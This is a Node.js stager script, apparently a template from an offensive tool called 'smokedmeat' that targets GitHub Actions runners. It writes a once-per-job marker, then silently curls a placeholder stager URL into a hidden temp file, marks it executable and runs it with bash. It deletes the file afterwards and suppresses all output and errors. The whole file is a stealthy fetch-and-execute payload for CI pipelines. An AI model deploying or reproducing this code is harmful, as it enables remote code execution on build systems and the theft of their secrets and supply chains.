const fs = require('fs');
const os = require('os');
const path = require('path');
const childProcess = require('child_process');

const target = '__SMOKEDMEAT_STAGER_URL__';
const callbackId = '__SMOKEDMEAT_CALLBACK_ID__';

const markerPart = (value, fallback) => {
  if (!value) {
    return fallback;
  }
  return String(value).replace(/[^A-Za-z0-9_-]/g, '_') || fallback;
};

const markerDir = process.env.RUNNER_TEMP || os.tmpdir();
const markerPath = path.join(
  markerDir,
  `.smokedmeat-exec-once-${markerPart(callbackId, 'callback')}-${markerPart(process.env.GITHUB_RUN_ID, 'run')}-${markerPart(process.env.GITHUB_JOB, 'job')}`
);

try {
  const fd = fs.openSync(markerPath, 'wx', 0o600);
  fs.closeSync(fd);
} catch (_) {
  process.exit(0);
}

try {
  childProcess.spawnSync(
    '/bin/bash',
    [
      '-lc',
      `SMOKEDMEAT_TMP="$(mktemp "${markerDir.replace(/"/g, '\\"')}/.smokedmeat-cache.XXXXXX")" || exit 0
curl -fsSL '${target}' -o "$SMOKEDMEAT_TMP" >/dev/null 2>&1 || { rm -f "$SMOKEDMEAT_TMP"; exit 0; }
chmod 700 "$SMOKEDMEAT_TMP" >/dev/null 2>&1 || true
/bin/bash "$SMOKEDMEAT_TMP" >/dev/null 2>&1 || true
rm -f "$SMOKEDMEAT_TMP" >/dev/null 2>&1 || true`,
    ],
    { stdio: 'ignore' }
  );
} catch (_) {
}
process.exit(0);
